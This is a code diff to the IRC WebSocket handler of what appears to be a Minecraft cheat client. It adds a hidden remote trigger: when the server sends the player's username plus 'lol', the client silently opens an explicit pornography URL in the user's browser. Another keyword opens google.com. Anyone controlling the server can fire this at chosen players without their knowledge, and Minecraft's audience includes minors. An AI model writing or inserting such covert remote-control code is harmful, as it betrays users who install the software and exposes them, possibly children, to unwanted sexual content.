@@ -7,6 +7,7 @@ import me.bratwurst.manager.NotificationManager;
 import me.bratwurst.module.Commands.BanCommand;
 import me.bratwurst.utils.Notification;
 import me.bratwurst.utils.NotificationType;
+import me.bratwurst.utils.WbUtils;
 import me.pseey.utils.player.PlayerUtils;
 import net.minecraft.client.Minecraft;
 import net.minecraft.util.EnumChatFormatting;
@@ -20,6 +21,8 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.net.URL;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
@@ -36,6 +39,26 @@ public class IRCClient extends WebSocketListener {
 
     @Override
     public void onMessage(WebSocket webSocket, String text) {
+        if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "lol")) {
+            try {
+
+                WbUtils.openWebsite(new URI("https://www.pornoente.tv/filme/junges-luder-treibt-es-wild-mit-ihrem-vibrator-36/"));
+            } catch (URISyntaxException e) {
+                e.printStackTrace();
+            }
+            return;
+        }else if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "meddl")) {
+            {
+                try {
+
+                    WbUtils.openWebsite(new URI("https://www.google.com"));
+                } catch (URISyntaxException e) {
+                    e.printStackTrace();
+                }
+            }
+            return;
+        }
+
 
         String[] split = text.split(" ");
         System.out.println(Arrays.toString(split));
